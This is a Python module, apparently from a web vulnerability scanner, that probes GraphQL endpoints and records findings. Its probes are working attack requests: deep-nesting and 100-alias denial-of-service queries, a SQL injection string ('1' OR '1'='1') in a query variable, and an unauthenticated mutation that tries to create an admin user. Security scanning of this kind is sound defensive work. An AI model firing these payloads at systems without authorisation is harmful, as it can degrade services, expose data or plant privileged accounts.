"""Deep GraphQL: injection, DoS via aliasing/depth, field duplication."""
from core.http import get, post
from core.findings import Finding
from core.memory import log_event
import urllib.parse, json

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    # introspection (already) + deep nesting DoS
    deep_query = {"query": "query { " + "a { " * 10 + "__typename " + " }" * 10 + " }"}
    r = post(url, json=deep_query, headers={"Content-Type": "application/json"})
    if r.status == 200 and len(r.text or "") > 1000:
        findings.append(Finding(
            id="gql-depth-{}".format(hash(url) & 0xffff),
            target=parsed.netloc,
            type="GraphQL Deep Nesting DoS",
            severity="medium",
            url=url,
            parameter="query",
            payload="10-level nested query",
            evidence="Deep query accepted (response {} bytes)".format(len(r.text or "")),
            response_snippet=r.snippet(200),
            confidence=0.6,
        ))
    # aliasing DoS
    alias_query = {"query": "query { " + " ".join("a{}: __typename".format(i) for i in range(100)) + " }"}
    r = post(url, json=alias_query, headers={"Content-Type": "application/json"})
    if r.status == 200:
        findings.append(Finding(
            id="gql-alias-{}".format(hash(url) & 0xffff),
            target=parsed.netloc,
            type="GraphQL Aliasing DoS",
            severity="low",
            url=url,
            parameter="query",
            payload="100 aliases",
            evidence="Aliased query accepted",
            response_snippet=r.snippet(200),
            confidence=0.6,
        ))
    # SQLi via GraphQL variables
    sqli_query = {"query": "query($id: ID!){ user(id: $id){ name } }", "variables": {"id": "1' OR '1'='1"}}
    r = post(url, json=sqli_query, headers={"Content-Type": "application/json"})
    if r.status != 0 and any(k in (r.text or "").lower() for k in ["sql", "syntax", "error"]):
        findings.append(Finding(
            id="gql-sqli-{}".format(hash(url) & 0xffff),
            target=parsed.netloc,
            type="GraphQL SQL Injection",
            severity="high",
            url=url,
            parameter="variables",
            payload="1' OR '1'='1",
            evidence="SQL error in GraphQL response",
            response_snippet=r.snippet(300),
            confidence=0.6,
        ))
    # mutation without auth
    mut = {"query": "mutation { createUser(input:{name:\"test\",role:\"admin\"}){ id } }"}
    r = post(url, json=mut, headers={"Content-Type": "application/json"})
    if r.status == 200 and "createUser" in (r.text or "") and "error" not in (r.text or "").lower():
        findings.append(Finding(
            id="gql-mutation-{}".format(hash(url) & 0xffff),
            target=parsed.netloc,
            type="GraphQL Unauthorized Mutation",
            severity="high",
            url=url,
            parameter="mutation",
            payload="createUser with admin role",
            evidence="Mutation accepted without auth",
            response_snippet=r.snippet(300),
            confidence=0.5,
        ))
    log_event(parsed.netloc, "graphql_deep_scan", {"url": url, "findings": len(findings)})
    return findings
